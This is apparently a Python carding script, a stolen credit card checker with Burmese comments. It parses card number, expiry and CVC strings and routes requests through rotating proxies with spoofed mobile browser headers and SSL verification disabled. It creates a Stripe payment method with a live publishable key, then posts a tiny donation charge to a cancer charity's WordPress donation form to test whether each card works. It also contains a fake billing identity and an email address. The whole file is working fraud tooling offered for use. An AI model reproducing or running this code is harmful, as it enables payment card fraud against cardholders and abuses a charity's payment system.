import requests, re, random, os, time
import urllib3

# SSL Warning တွေ မတက်အောင် ပိတ်ထားခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== Proxy helper =====
def get_proxy():
    try:
        with open("proxy.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            line = random.choice(proxies)
            # ip:port:user:pass format ကို စစ်ဆေးခြင်း
            parts = line.split(":")
            if len(parts) == 4 and not line.startswith("http"):
                ip, port, user, pw = parts
                return f"http://{user}:{pw}@{ip}:{port}"
            return line  # http://... format ဖြစ်ပြီးသား
    except Exception as e:
        print(f"[PROXY] error: {e}")
        pass
    return os.getenv("PROXY_URL")

def Tele(ccx):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")[:4]
    except Exception:
        return "invalid card format"

    if "20" in yy:
        yy = yy.split("20")[1]

    # ✅ Session ဖန်တီးပြီး proxy သတ်မှတ်
    r = requests.session()
    proxy = get_proxy()
    if proxy:
        r.proxies = {"http": proxy, "https": proxy}

    random_amount1 = random.randint(1, 4)
    random_amount2 = random.randint(1, 99)

    # ===== STEP 1: create payment method =====
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    data = (
        f'type=card&billing_details[name]=Niko'
        f'&card[number]={n}&card[cvc]={cvc}'
        f'&card[exp_month]={mm}&card[exp_year]={yy}'
        f'&guid=NA&muid=NA&sid=NA&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2Fa246437755%3B+stripe-js-v3%2Fa246437755%3B+card-element'
        f'&key=pk_live_KgCOosHro91pZXJzb7nQOFEJ00m4nfhXh6'
    )

    try:
        response = r.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers, data=data, timeout=10,
            verify=False  # ✅ SSL Error ကျော်ရန်
        )
        pm = response.json()['id']
    except Exception as e:
        return f"stripe error: {e}"

    # ===== STEP 2: charge on donation site =====
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://staging.spottingcancer.org',
        'Referer': 'https://staging.spottingcancer.org/donate/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'action': 'wp_full_stripe_inline_payment_charge',
        'wpfs-form-name': 'One-Time-Donation',
        'wpfs-form-get-parameters': '%7B%7D',
        'wpfs-custom-amount': 'other',
        'wpfs-custom-amount-unique': '0.5',
        'wpfs-custom-input[]': 'Lee',
        'wpfs-billing-name': 'Niko Daxx ',
        'wpfs-billing-address-country': 'US',
        'wpfs-billing-address-line-1': '27 Allen St',
        'wpfs-billing-address-line-2': '',
        'wpfs-billing-address-city': 'New York ',
        'wpfs-billing-address-state': '',
        'wpfs-billing-address-state-select': 'NY',
        'wpfs-billing-address-zip': '10002',
        'wpfs-card-holder-email': 'sattlin10@gmail.com',
        'wpfs-card-holder-name': 'Niko',
        'wpfs-stripe-payment-method-id': f'{pm}',
    }

    try:
        response = r.post(
            'https://staging.spottingcancer.org/wp-admin/admin-ajax.php',
            headers=headers, data=data, timeout=10,
            verify=False  # ✅ SSL Error ကျော်ရန်
        )
        result = response.json()['message']
    except Exception as e:
        return f"charge error: {e}"

    return result